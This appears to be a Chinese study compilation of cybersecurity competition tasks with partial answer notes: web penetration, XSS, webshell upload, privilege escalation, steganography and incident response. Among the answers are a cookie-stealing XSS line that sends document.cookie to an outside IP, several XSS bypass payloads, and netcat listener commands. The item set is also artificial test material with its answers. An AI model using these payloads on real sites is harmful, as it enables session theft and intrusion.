ü 服务器场景操作系统：Microsoft Windows2008 Server

ü 服务器环境：phpstudy

ü 服务器场景用户名：administrator；密码：未知（开放链接）

ü 渗透机场景：kali

ü 渗透机用户名：root，密码：toor

ü 渗透机场景：windows 7

ü 渗透机用户名：administrator，密码：123456

1. 使用渗透机场景kali中工具扫描服务器，将服务器上 File
Inclusion首页概述页中的flag提交；

2. 使用渗透机场景windows7访问服务其场景网站中FileInclusion(local)页面，找到www同级目录下的flag.txt文件并将其内容提交；

3. 使用渗透机场景kali中的工具获取服务器的登陆密码，将登录密码作为flag提交；

4. 使用第3题中获取的登陆密码登陆服务器，填写File
Inclusion(local)页面文件中的FLAG1并提交（不能修改原网页的呈现效果）；

5. 使用第3题中获取的登陆密码登陆服务器，填写File
Inclusion(local)页面文件中的FLAG2并提交（不能修改原网页的呈现效果）；

6. 使用第3题中获取的登陆密码登陆服务器，填写File
Inclusion(local)页面文件中的FLAG3并提交（不能修改原网页的呈现效果）；

7. 使用第3题中获取的登陆密码登陆服务器，填写File
Inclusion(local)页面文件中的FLAG4并提交（不能修改原网页的呈现效果）；

8. 使用第3题中获取的登陆密码登陆服务器，填写File
Inclusion(local)页面文件中的FLAG5并提交（不能修改原网页的呈现效果）；

9. 使用第3题中获取的登陆密码登陆服务器，填写File
Inclusion(local)页面文件中的FLAG5并提交（不能修改原网页的呈现效果）。

任务4. Web渗透测试（100分）

**任务环境说明：**

ü 服务器场景：PYsystemWH4(后门漏洞)

ü 服务器场景操作系统：未知

1.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH4进行渗透测试，将该场景中Apache的版本号作为Flag值（例如：2.2.3）提交；

flag:Apache/2.2.15

![截图.png](    赛题环境解析/media/image211.png){width="5.760416666666667in"
height="3.2916666666666665in"}

2. 通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH4进行渗透测试，将该场景中PHP的版本号作为Flag值（例如：5.2.14）提交；

**环境有问题没装php**

![截图.png](    赛题环境解析/media/image212.png){width="3.6527777777777777in"
height="0.6261909448818898in"}

3\.
通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH4进行渗透测试，将该场景中数据库的版本号作为Flag值（例如：5.0.22）提交；

history发现记录里的mysql密码

![截图.png](    赛题环境解析/media/image213.png){width="3.9166666666666665in"
height="2.3854166666666665in"}

![截图.png](    赛题环境解析/media/image214.png){width="5.760416666666667in"
height="2.302415791776028in"}

![截图.png](    赛题环境解析/media/image215.png){width="2.486111111111111in"
height="2.308532370953631in"}

4. 通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH4进行渗透测试，将该场景的内核版本号作为Flag值（例如：2.6.18）提交；

![截图.png](    赛题环境解析/media/image216.png){width="3.111111111111111in"
height="0.7803794838145232in"}

5.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH4进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为Flag值提交；（17分）.

环境根本找不到222文件夹

6. 通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH4进行渗透测试，将该场景 /var/www/html/目录中唯一一个后缀为.shtml的文件内容作为Flag值提交；

![截图.png](    赛题环境解析/media/image217.png){width="5.760416666666667in"
height="3.2402351268591425in"}

**任务环境说明：**

ü 服务器场景：PYsystemWH6(后门漏洞)

[· 服务器场景操作系统：Linux（版本不详）（关闭链接）]{.mark}

[1. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务版本信息字符串作为Flag值提交；]{.mark}

![截图.png](    赛题环境解析/media/image218.png){width="5.760416666666667in"
height="2.7055380577427823in"}

[2. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp文件的文件名称作为Flag值提交；]{.mark}

![截图.png](    赛题环境解析/media/image219.png){width="3.6527777777777777in"
height="1.8681353893263342in"}

[3. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp的图片文件中的英文单词作为Flag值提交；]{.mark}

![截图.png](    赛题环境解析/media/image220.png){width="5.760416666666667in"
height="3.2402351268591425in"}

[4. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件名称作为Flag值提交；]{.mark}

![截图.png](    赛题环境解析/media/image221.png){width="3.3333333333333335in"
height="3.9375in"}

[5. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件内容作为Flag值提交；]{.mark}

![截图.png](    赛题环境解析/media/image222.png){width="4.444444444444445in"
height="2.14415791776028in"}

[6. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件名称作为Flag值提交；]{.mark}

![截图.png](    赛题环境解析/media/image223.png){width="1.6944444444444444in"
height="1.8295844269466317in"}

[7. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件内容作为Flag值提交；]{.mark}

![截图.png](    赛题环境解析/media/image224.png){width="4.069444444444445in"
height="2.1808048993875766in"}

[8. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件名称作为Flag值提交；]{.mark}

![截图.png](    赛题环境解析/media/image225.png){width="1.9722222222222223in"
height="2.56701990376203in"}

[9. 通过本地PC中渗透测试平台Kali2.0对服务器场景Linux2020进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件内容作为Flag值提交。]{.mark}

![截图.png](    赛题环境解析/media/image226.png){width="2.0833333333333335in"
height="0.4166666666666667in"}

**任务三：代码审计 **

**任务环境说明：**

ü 服务器场景：PYsystem0035

ü 服务器场景操作系统：windows

ü 服务器场景用户名:未知 密码：未知

1.在渗透机Kali
Linux中访问靶机服务器Web页面，注册d账号并登陆，找到存在XSS执行漏洞的页面，将该页面中存在XSS执行漏洞的对象名作为FLAG提交；（2分）

![截图.png](    赛题环境解析/media/image227.png){width="5.760416666666667in"
height="2.4375273403324584in"}

![截图.png](    赛题环境解析/media/image228.png){width="5.760416666666667in"
height="2.5670581802274715in"}

flag:name

2.构造Cookie反弹JS脚本，将该JS代码中使用的对象及方法作为FLAG（形式：对象.方法）进行提交；（2分）

document.write(\'\<img
src=\"http://1.1.1.1:8080/xss?val=\'+document.cookie+\'\"width=0
height=0 /\>\')

js代码中使用的对象和方法

Flag:document.write

3.在渗透机Kali
Linux中重启Web服务，将重启使用的命令作为FLAG进行提交；（2分）

[Flag:service apache2 restart]{.mark}

4.在靶机服务器中利用原有的XSS漏洞调用上述JS脚本，在渗透机Kali
Linux中开启3333端口监听，将开启端口监听使用的命令作为FLAG提交；（2分）

Flag:nc -l -p

5.在渗透机Kali
Linux中开启3333端口监听，将开启端口监听后接收回应的第一行的第一个单词作为FLAG提交；（2分）

![截图.png](    赛题环境解析/media/image229.png){width="5.760416666666667in"
height="1.7871872265966755in"}

[Flag:GET]{.mark}

6.在渗透机Kali
Linux中开启3333端口监听，将开启端口监听后接收回应的第五行的最后一个单词作为FLAG提交。（2分）

![截图.png](    赛题环境解析/media/image230.png){width="5.760416666666667in"
height="1.5564566929133858in"}

[Flag：deflate ]{.mark}

**B-6：隐写术应用**

**任务环境说明：**

ü  服务器场景：FTPServer20220520（关闭链接）

ü  FTP用户名:anonymous密码：anonymous

1.  找出文件夹1中的文件，将文件中的隐藏信息作为flag值提交；

2.  找出文件夹2中的文件，将文件中的隐藏信息作为flag值提交；

3.  找出文件夹3中的文件，将文件中的隐藏信息作为flag值提交；

4.  找出文件夹4中的文件，将文件中的隐藏信息作为flag值提交；

5.  找出文件夹5中的文件，将文件中的隐藏信息作为flag值提交。

**B-7：数据分析**

**任务环境说明：**

ü  服务器场景：FTPServer(关闭链接)

ü  FTP用户名:infoacq密码：infoacq

1.  从靶机服务器的FTP上下载数据包文件，分析该文件，找出黑客入侵使用的协议，提交协议名称。

2.  分析该文件，找出黑客入侵获取的zip压缩包文件，提交压缩包文件名。

3.  分析该文件，找出黑客入侵获取的敏感文件，提交敏感文件的文件名。

4.  分析该文件，找出黑客入侵获取的敏感文件，提交该敏感文件泄露的时间。

5.  分析该文件，找出黑客入侵获取的敏感文件，提交该敏感文件中泄露的文件夹名称。

**任务二十九： Web安全应用-2**

**任务环境说明：**

√ 服务器场景： match_win03-3-1（关闭链接）

    √ 服务器场景操作系统：Windows Server 2003

1\. 使用渗透机Kali
Linux，登录靶机HTTP服务后台管理页面，并将后台管理页面代码中的Flag值提交。

明明字典里面有却扫不出来 很难受

原来后台就在web页面

2.  使用渗透机Kali
Linux，访问靶机HTTP服务，使用文本反馈功能上传PHP一句话木马（shell.php），并将上传后提示页面中唯一一行JavaScript代码作为Flag值提交。

3.  使用渗透机Kali
Linux，访问靶机HTTP服务，通过一句话木马获取靶机C盘根目录下flag.txt中的内容，并将获取文件内容的函数作为Flag值提交。

4.  使用渗透机Kali
Linux，访问靶机HTTP服务，通过一句话木马获取靶机C盘根目录下flag.txt中的内容，并将文本中的内容作为Flag值提交。

5.  使用渗透机Kali
Linux，访问靶机HTTP服务，通过一句话木马找到C盘根目录下的唯一一个PNG图片文件，并提交图片源文件中的Flag值。

**任务四：CTF-Misc（80分）**

**任务环境说明：**

√ 服务器场景：JSsystem0002=Server2124（ctfmisc.zip）

√ 服务器场景操作系统：未知

√ 服务器场景FTP用户名：ftp  密码：空

1.找出文件夹1中的文件，将文件中的隐藏信息作为Flag值提交；（20分）

binwalk发现照片，使用dd把照片分离出来

![截图.png](    赛题环境解析/media/image231.png){width="5.760416666666667in"
height="2.5654965004374453in"}

有一根平行的细线（找到只需一个万花筒）

![截图.png](    赛题环境解析/media/image232.png){width="5.760416666666667in"
height="3.4538681102362205in"}

发现只有一个red有说明是red低位隐写

![截图.png](    赛题环境解析/media/image233.png){width="5.760416666666667in"
height="4.232306430446195in"}

2.找出文件夹2中的文件，将文件中的隐藏信息作为Flag值提交；（20分）

python切片逆转

![截图.png](    赛题环境解析/media/image234.png){width="4.888888888888889in"
height="0.6671402012248469in"}

![截图.png](    赛题环境解析/media/image235.png){width="3.486111111111111in"
height="0.5411275153105862in"}

3.找出文件夹3中的文件，将文件中的隐藏信息作为Flag值提交；（15分）

convert工具

[convert glance.gif flag.png #将glance.gif分割成多个flag.png]{.mark}

[montagee工具]{.mark}

[montage flag\*.png -tile x1 -geometry +0+0 flag.png #合并图片]{.mark}

![截图.png](    赛题环境解析/media/image236.png){width="5.760416666666667in"
height="2.9661286089238845in"}

4.找出文件夹4中的文件，将文件中的隐藏信息作为Flag值提交；（15分）

第十一步，将图片上传至kali，在Kali上使用命令identify -format "%s %T \\n"
100_KHf05OI.gif来拆解图像文件的，找出每一帧可能存在的规律,
-format输出图片的特点，%s（scene number）表示场景数量，%T（top of
filename）文件名顶部，通俗理解就是按顺序列出每一帧头部的二进制信息，使用命令identify
-format "%T\\n" 100_KHf05I.gif辅助我们找到Gif的每一帧存在规律

 

然后将有规律的2进制转ascii

![截图.png](    赛题环境解析/media/image237.png){width="5.760416666666667in"
height="2.5537849956255467in"}

5.  找出文件夹5中的文件，将文件中的隐藏信息作为Flag值提交。（10分）

把后缀改png，QR扫就成了

![截图.png](    赛题环境解析/media/image238.png){width="5.760416666666667in"
height="6.927083333333333in"}

**B-8：Linux操作系统渗透测试（linux永恒之蓝）**

**任务环境说明：**

ü  服务器场景：Server2180（关闭链接）

ü  服务器场景操作系统：Ubuntu

ü  用户名:未知 密码：未知

1.   找出Apache的版本号作为Flag值（例如：2.2.15）提交；

2.   找出Samba服务器的版本号作为Flag值（例如：5.0.22）提交；

3.   找出系统内核版本号作为Flag值（例如：2.6.18）提交；

4.   找出网站跟路径下的图片内容作为Flag值提交；

5.   找出/root目录中的txt文件，将文件内容为Flag值提交；

**B-9：逆向分析及破解**

**任务环境说明：**

ü  服务器场景：FTPServer20220521（开放链接）

ü  用户名：crackme密码：crackme123

1. 
找从靶机上下载CrackMe.exe，分析该文件，请提交该程序的逻辑验证函数。提交格式：XXXX；

2.  提交程序校验成功后的返回值。提交格式：XXXX；

3.  将程序关键代码处偏移量进行提交。 提交格式：0xXXXXXX；

4.  提交程序关键字符串。提交格式：0xXXXX

5． 破解该程序，提交flag的值。提交格式：XXXX

**B-10：系统漏洞利用与提权**

**任务环境说明：**

ü  服务器场景：Server2217（关闭链接）

ü  服务器场景操作系统：未知

ü  用户名:未知 密码：未知

1．
对靶机进行系统服务及版本扫描安全渗透测试，并将该操作结果中8081端口对应的服务版本信息字符串作为Flag值提交；

2．将获取到的当前web权限，作为Flag提交；

3．找出系统jetty中间价启动目录，将其路径作为Flag提交；

4．提交所利用的提权文件，将该文件名作为Flag提交；

5．将/root目录下唯一一个txt文件的内容作为Flag提交

**B-1：系统漏洞利用与提权**

**任务环境说明：**

ü 服务器场景：PYsystem001

ü 服务器场景操作系统：Ubuntu（显示链接）

ü 服务器用户名:未知 密码：未知

1. 使用nmap扫描靶机系统，将靶机开放的端口号按从小到大的顺序作为FLAG（形式：\[端口1,端口2...,端口n\]）提交；

2. 443,8080

![截图.png](    赛题环境解析/media/image239.png){width="5.760416666666667in"
height="2.27546697287839in"}

3. 通过上述端口访问靶机系统，使用弱口令进行登录，将正确的用户名和密码作为FLAG（形式：\[用户名,密码\]）提交；

Admin,123456

5. 利用Kali渗透机生成反弹木马，将生成木马命令执行后提示的第四行的首个单词作为FLAG（形式：\[单词\]）提交；

![截图.png](    赛题环境解析/media/image240.png){width="5.760416666666667in"
height="2.5195472440944884in"}

7. Payload

8. 对上述木马文件进行修改后上传到靶机系统中，使用MSF开启监听，将获得的当前权限的用户名作为FLAG（形式：\[用户名\]）提交；

![截图.png](    赛题环境解析/media/image241.png){width="5.760416666666667in"
height="3.2408694225721786in"}

![截图.png](    赛题环境解析/media/image242.png){width="5.760416666666667in"
height="3.134643482064742in"}

13. 查看系统内核版本信息，将系统内核版本号作为FLAG（形式：\[版本号\]）提交；

14. 3.13.0-45-generic

15. 在Kali攻击机中查找可使用的漏洞源码，将找到的漏洞源码文件名作为FLAG（形式：\[文件名\]）提交；

16. 37292.c

17. 利用上述漏洞源码后获得到的靶机/root下的唯一.txt文件的文件名作为FLAG（形式：\[文件名\]）提交；

![截图.png](    赛题环境解析/media/image243.png){width="5.263888888888889in"
height="4.5863593613298335in"}

19. adftutij.txt

20. 利用上述漏洞源码后将获得到的靶机/root下的唯一.txt文件的文件内容作为FLAG（形式：\[文件内容\]）提交。

21. hyjufk983

**B-1任务一：smb信息收集**

任务环境说明： 

  服务器场景：Server（封闭靶机）

  用户名:administrator密码：未知

1. 
使用暴力破解工具对服务器的服务器信息块协议暴力破解，字典在服务器的网站的首页，将获取的密码作为flag提交；

2. 
使用访问工具对服务器服务访问，将查看到最后一个共享文件名称作为flag提交；

3. 
使用访问工具对服务器服务访问，将服务器中管理员桌面的文本文档里的内容作为flag提交；

4.  使用访问工具对服务器服务访问，将服务器中DNS2的地址作为flag提交；

5.  使用访问工具对服务器服务访问，将服务器中最后一个用户名作为flag提交；

6.  使用访问工具对服务器服务访问，将服务器中所有驱动器作为flag提交；

**任务三十九： 私钥暴力破解攻击**

**任务环境说明：**

√ 服务器场景：Server2211（关闭链接）

    √ FTP用户名：匿名用户

1. 
通过渗透机访问靶机FTP服务，获取FTP服务中的Python文件，将Python文件的文件名作为Flag值提交；

2.  完善获取的Python文件，填写该文件当中空缺的Flag1
字符串，并将该字符串作为 Flag 值提交；

3. 
继续完善Python文件，填写该文件当中空缺的Flag2字符串，并将该字符串作为
Flag 值提交；

4. 
继续完善Python文件，填写该文件当中空缺的Flag3字符串，并将该字符串作为
Flag 值提交；

5. 
继续完善Python文件，填写该文件当中空缺的Flag4字符串，并将该字符串作为
Flag 值提交；

6. 
继续完善Python文件，填写该文件当中空缺的Flag5字符串，并将该字符串作为
Flag 值提交；

7.  将完善好的Python文件在
Kali上执行，将执行成功后的"Success"后面的内容作为 Flag 值提交。

**B-3：应用服务漏洞扫描与利用**

**任务环境说明：**

ü 服务器场景：Server2115=Server15

ü 服务器场景操作系统：未知（关闭链接）

1. 使用命令nmap探测目标靶机的服务版本信息，将需要使用的参数作为FLAG进行提交；

flag: -sV

![截图.png](    赛题环境解析/media/image244.png){width="5.760416666666667in"
height="2.0509448818897638in"}

2. 通过上述端口访问靶机系统并探测隐藏的页面，将找到的敏感文件、目录名作为FLAG（形式：\[敏感文件或目录1,敏感文件或目录2...,敏感文件或目录n\]）提交；

flag:\[.ssh,robots.txt\]

![截图.png](    赛题环境解析/media/image245.png){width="5.430555555555555in"
height="4.54457239720035in"}

3. 通过上述敏感文件或目录下载可利用的私钥和认证关键字文件，将私钥文件名和认证关键字文件名作为FLAG（形式：\[私钥文件名,认证关键字文件名\]）进行提交；

\[id_rsa,authorized_keys\]

![截图.png](    赛题环境解析/media/image246.png){width="5.760416666666667in"
height="0.8156342957130359in"}

4. 查找认证关键字文件中用于登录靶机服务器的用户名，将用户名作为FLAG提交；

flag:simon

![截图.png](    赛题环境解析/media/image247.png){width="5.760416666666667in"
height="2.4340791776027997in"}

一定要给chmod 600 权限不然会报错,

5. 使用该用户名及私钥登录靶机服务器，将服务器返回信息的第一行结尾的最后一个英文单词作为FLAG提交；

![截图.png](    赛题环境解析/media/image248.png){width="5.760416666666667in"
height="1.2632491251093614in"}

6. 将私钥文件进行格式转换后进行解密，将成功解密出的密码作为FLAG提交；

![截图.png](    赛题环境解析/media/image249.png){width="5.760416666666667in"
height="2.251654636920385in"}

7. 利用靶机服务器上的溢出程序进行提权，将接收用户输入的缓冲区的大小作为FLAG提交；

![截图.png](    赛题环境解析/media/image250.png){width="5.760416666666667in"
height="3.3944028871391074in"}

8. 成功提权后将获得到的靶机/root下的唯一.txt文件的文件名作为FLAG（形式：\[文件名\]）提交；

开头必须是Simon后门加上15个字符到20个后写入/bin/sh提权

![截图.png](    赛题环境解析/media/image251.png){width="5.760416666666667in"
height="1.2664238845144358in"}

9. 利用上述漏洞源码后将获得到的靶机/root下的唯一.txt文件的文件内容作为FLAG（形式：\[文件内容\]）提交。

![截图.png](    赛题环境解析/media/image252.png){width="4.819444444444445in"
height="2.2796073928258966in"}

**任务环境说明：**

ü 服务器场景：Server10=Server1

ü 服务器场景操作系统：windows

1. 黑客通过网络攻入本地服务器，在Web服务器的主页上外挂了一个木马连接，请你找到此连接并删除该连接，将对应的标题名称作为flag值提交；(破解密码远程登录方便寻找)

![截图.png](    赛题环境解析/media/image253.png){width="5.760416666666667in"
height="2.6592300962379705in"}

找到网站根目录

![截图.png](    赛题环境解析/media/image254.png){width="5.760416666666667in"
height="4.269812992125984in"}

![截图.png](    赛题环境解析/media/image255.png){width="5.760416666666667in"
height="3.691813210848644in"}

![截图.png](    赛题环境解析/media/image256.png){width="5.760416666666667in"
height="3.672749343832021in"}

2. 黑客攻入本地的数据库服务器，并添加了除admin以外的具有一个管理员权限的超级用户，将此用户的密码作为flag值提交；

![截图.png](    赛题环境解析/media/image257.png){width="5.760416666666667in"
height="2.334484908136483in"}

3. 黑客攻入本地服务器，在本地服务器建立了多个超级用户，请你删除除了Administrator用户以外的其他超级管理员用户，然后在命令行窗口输入net
user，将Administrator右边第一个单词作为flag值提交；

![截图.png](    赛题环境解析/media/image258.png){width="5.760416666666667in"
height="1.3985269028871392in"}

4. 黑客修改了服务器的启动内容，请你删除不必要的启动项程序，将该启动项程序的名称作为flag值提交；（如有多个名称之间以英文逗号分隔，例hello,test）

![截图.png](    赛题环境解析/media/image259.png){width="5.760416666666667in"
height="4.320312773403325in"}

5. 黑客在服务器某处存放了一个木马程序，请你找到此木马程序并清除木马，将木马文件名作为flag值提交。

![截图.png](    赛题环境解析/media/image255.png){width="5.760416666666667in"
height="3.691813210848644in"}

**B-5：网络安全应急响应**

**任务环境说明：**

ü  服务器场景：Server2228（开放链接）

ü  用户名：root，密码：p@ssw0rd123

1.  找出被黑客修改的系统别名，并将倒数第二个别名作为Flag值提交；

2.  找出系统中被植入的后门用户删除掉，并将后门用户的账号作为Flag值提交（多个用户名之间以英文逗号分割，如：admin,root）；

3.  找出黑客在admin用户家目录中添加的ssh后门，将后门的写入时间作为Flag值（提交的时间格式为：2022-01-12
08:08:18）

4.  找出黑客篡改过的环境变量文件并还原，将文件的md5值作为Flag值提交；

5.  找出黑客修改了bin目录下的某个文件，将该文件的格式作为Flag值提交；

6.  找出黑客植入系统中的挖矿病毒，将矿池的钱包地址作为Flag值（提交格式为：0xa1d1fadd4fa30987b7fe4f8721b022f4b4ffc9f8）提交。

**B-4：Web安全渗透测试**

**任务环境说明：**

ü  服务器场景名称：Server2010（关闭链接）

ü  服务器场景操作系统：未知

1.  使用渗透机场景Kali中的工具扫描服务器，通过扫描服务器得到web端口，登陆网站（网站路径为IP/up）,找到网站首页中的Flag并提交;

2.  使用渗透机场景windows7访问服务其场景中的网站，通过上题给的信息获取本题，并将本题中的Flag提交；

3.  使用渗透机场景windows7根据第二题的入口继续访问服务器本题场景，通过提示得到Flag并提交；

4.  使用渗透机场景windows7根据第三题入口继续访问服务器的本题场景，通过提示联系前两题上传特定文件名得到Flag并提交；

5.  使用渗透机场景windows7根据第四题入口继续访问服务器的本题场景，通过提示得到Flag并提交；

6.  使用渗透机场景windows7根据第五题入口继续访问服务器的本题场景，通过提示得到Flag并提交；

7.  使用渗透机场景windows7访问http://靶机IP/7，对该页面进行渗透测试,通过提示得到Flag并提交；

8.  使用渗透机场景windows7访问http://靶机IP/8，对该页面进行渗透测试,通过提示得到Flag并提交；

9.  使用渗透机场景windows7访问http://靶机IP/9，对该页面进行渗透测试,通过提示得到Flag并提交；

10\.
使用渗透机场景windows7访问http://靶机IP/10，对该页面进行渗透测试,通过提示得到Flag并提交；

11\.
使用渗透机场景windows7访问http://靶机IP/11，对该页面进行渗透测试,通过提示得到Flag并提交；

12\.
使用渗透机场景windows7访问http://靶机IP/12，对该页面进行渗透测试,通过提示得到Flag并提交；

13\.
使用渗透机场景windows7访问http://靶机IP/13，对该页面进行渗透测试,通过提示得到Flag并提交；

**B-3：跨站脚本攻击**

**任务环境说明：**

ü  服务器场景：Server2126（关闭链接）

ü  服务器场景操作系统：未知

ü  用户名:未知 密码：未知

1.  访问服务器网站目录1，根据页面信息完成条件，将获取到弹框信息作为flag提交；

![截图.png](    赛题环境解析/media/image260.png){width="5.760416666666667in"
height="4.273120078740157in"}

2.  访问服务器网站目录2，根据页面信息完成条件，将获取到弹框信息作为flag提交；

xsser，\"\>绕过然后使用大写绕过得到flag

![截图.png](    赛题环境解析/media/image261.png){width="5.760416666666667in"
height="4.505091863517061in"}

![截图.png](    赛题环境解析/media/image262.png){width="5.760416666666667in"
height="5.132250656167979in"}

3.  访问服务器网站目录3，根据页面信息完成条件，将获取到弹框信息作为flag提交；

[需要写入javascript:alert(1)，就可以利用超链接进行跳转！]{.mark}

[Unicode编码]{.mark}

![截图.png](    赛题环境解析/media/image263.png){width="4.569444444444445in"
height="1.5717224409448818in"}

![截图.png](    赛题环境解析/media/image264.png){width="5.760416666666667in"
height="6.3009842519685035in"}

访问服务器网站目录4，根据页面信息完成条件，将获取到弹框信息作为flag提交；

Playload:\" onclick=alert(\'hacker\')type=text

在存储的cookie中输入payload，之后再次访问网页中的文本框

![localFile.png](    赛题环境解析/media/image265.png){width="5.666666666666667in"
height="6.145833333333333in"}

![截图.png](    赛题环境解析/media/image266.png){width="5.760416666666667in"
height="2.0625in"}

 访问服务器网站目录5，根据页面信息完成条件，将获取到弹框信息作为flag提交Flag{QmRhA990viE8yP/PWbnKhw}

Payload:onmouseover=\"alert(\'hacker\')\"

![截图.png](    赛题环境解析/media/image267.png){width="5.760416666666667in"
height="3.670446194225722in"}

访问服务器网站目录6，根据页面信息完成条件，将获取到弹框信息作为flag提交；

**Flag{LHOm3XR7ig6+hgo2Zd/Y6g}**

Payload:?Keyword=\<img src=x onerror=alert('hacker')\>

换行绕过

![localFile.png](    赛题环境解析/media/image268.png){width="5.760416666666667in"
height="1.7780347769028872in"}

**任务二：Web隐藏信息获取**

**任务环境说明：**

ü 服务器场景名：web20200604

ü 服务器场景用户名：未知

1. 通过本地PC中渗透测试平台Kali使用Nmap扫描目标靶机HTTP服务子目录，将扫描子目录命令所需参数及第四条扫描结果关键目录以&符号拼接，作为Flag提交（例：-p 22&/root/）；

Flag:** \--script http-enum&/auth/**

2. 通过本地PC中渗透测试平台Kali访问目标靶机管理登录页面，将管理登录页面的文件名（例：admin.php）作为Flag提交；

Flag:** adminLogin.php**

3. 通过本地PC中渗透测试平台Kali使用SQL注入扫描工具对目标靶机HTTP服务进行SQL盲注注入测试，将注入成功所需参数名称以&符号拼接，作为Flag提交；

Flag:** u&level**

4. 通过本地PC中渗透测试平台Kali访问目标靶机管理登录页面，使用正确的管理员用户名及密码登录，使用Python将导致登录失败的参数和值转换为正确的格式，将异常参数的值转换后作为Flag提交；

Flag: **P%23ssw%24rd**

5. 通过本地PC中渗透测试平台Kali访问目标靶机管理登录页面，使用正确的管理员用户名及密码登录，将登录成功后界面返回结果的第一行文字作为Flag提交；

**通过盲注，找到用户名密码，登录显示（显示文字）**

6. 通过本地PC中渗透测试平台Kali访问目标靶机HTTP服务，将登录成功后的返回结果作为Flag提交；

**通过盲注，找到用户名密码，登录显示（显示flag）**

**任务六：nmap扫描渗透测试**

任务环境说明：

· 服务器场景：Linux

· 服务器场景操作系统：Linux（关闭链接）

1. 通过PC中的渗透测试平台BT5对服务器场景Linux进行TCP同步扫描
(使用工具nmap，使用参数n，使用必须要使用的参数)，并将该操作使用命令中必须要使用的参数作为Flag提交；

2. 通过PC中的渗透测试平台BT5对服务器场景Linux进行TCP同步扫描
(使用工具nmap，使用参数n，使用必须要使用的参数)，并将该操作显示结果中从下往上数第4行的服务名称作为Flag提交；

3. 通过PC2中渗透测试平台BT5对服务器场景Linux不ping主机进行扫描（使用工具nmap，使用参数n，使用必须要使用的参数），并将该操作使用命令中必须要使用的参数作为Flag提交；

4. 通过PC2中渗透测试平台BT5对服务器场景Linux不ping主机进行扫描（使用工具nmap，使用参数n，使用必须要使用的参数），并将该操作显示结果的上数第10行的"："后的数字作为Flag提交；

5. 通过PC2中渗透测试平台BT5对服务器场景Linux进行UDP扫描渗透测试只扫描53，111端口（使用工具nmap，使用参数n，使用必须要使用的参数），并将该操作显示结果中111端口的状态作为Flag提交；

6. 通过PC2中渗透测试平台BT5对服务器场景Linux进行滑动窗口扫描渗透测试（使用工具nmap，使用必须要使用的参数），并将该操作使用命令中必须要使用的参数作为Flag提交；

7. 通过PC2中渗透测试平台BT5对服务器场景Linux进行RPC扫描扫描渗透测试（使用工具nmap，使用必须要使用的参数）,并将该操作使用命令中必须要使用的参数作为Flag提交；

8. 通过PC2中渗透测试平台BT5对服务器场景Linux进行RPC扫描扫描渗透测试（使用工具nmap，使用必须要使用的参数）,并将该操作显示结果中从下往上数第7行的服务版本信息作为Flag提交；

**任务一：nmap扫描渗透测试**

任务环境说明：

ü 服务器场景：Linux

ü 服务器场景操作系统：Linux（版本不详）

提示：使用nmap进行脆弱性漏洞扫描应使用命令nmap -p 3306 \--script=mysql-brute.nse 【ip】 ，则脚本名称为mysql-brute.nse

1.在本地PC渗透测试平台Kali中使用nmap工具查看本地路由与接口,并将该操作使用的全部命令作为FLAG提交；

2.通过本地PC中渗透测试平台Kali对服务器场景Linux进行VNC服务扫描渗透测试，并将使用的脚本名称作为FLAG提交（例mysql-brute.nse）；

3.通过本地PC中渗透测试平台Kali对服务器场景Linux进行VNC服务扫描渗透测试，并将该操作显示结果中VNC版本号作为FLAG提交；

4.在本地PC渗透测试平台Kali中使用nmap发送空的UDP数据对类DNS服务avahi进行拒绝服务攻击，并将使用的脚本名称作为FLAG提交（例mysql-brute.nse）；

5.通过本地PC中渗透测试平台Kali对服务器场景Linux进行模糊测试，来发送异常的包到靶机服务器，探测出隐藏在服务器中的漏洞 ，并将使用的脚本名称作为FLAG提交（例mysql-brute.nse）；

6.在本地PC渗透测试平台Kali中使用zenmap工具扫描服务器场景可能存在远程任意代码执行漏洞，并将使用的脚本名称的字符串作为FLAG提交;
（例mysql-brute.nse）；

7.在本地PC渗透测试平台Kali中使用zenmap工具扫描服务器场景可能存在远程任意代码执行漏洞（提示：检测路径为/cgi-bin/bin，需添加\--script-args
uri=/cgi-bin/bin参数），并将该操作显示结果中漏洞编号和发布时间作为FLAG提交（漏洞编号和发布时间的字符串之间以分号隔开）。

**任务四：Windows操作系统渗透测试**

**任务环境说明：**

ü  服务器场景：PYsystemZJW

ü  服务器场景操作系统：Windows（关闭链接）

1. 
通过本地PC中渗透测试平台Kali对服务器场景PYsystemZJW进行系统服务及版本扫描渗透测试，并将该操作显示结果中445端口对应的服务版本信息字符串作为FLAG提交；

![截图.png](    赛题环境解析/media/image269.png){width="5.760416666666667in"
height="3.1177515310586177in"}

2. 
通过本地PC中渗透测试平台Kali对服务器场景PYsystemZJW进行渗透测试，将该场景网络连接信息中的DNS信息作为FLAG提交;(例如114.114.114.114)

3. 
通过本地PC中渗透测试平台Kali对服务器场景PYsystemZJW进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文件名称作为FLAG提交；

![截图.png](    赛题环境解析/media/image270.png){width="5.760416666666667in"
height="1.3849704724409448in"}

4. 
通过本地PC中渗透测试平台Kali对服务器场景PYsystemZJW进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文档内容作为FLAG提交；

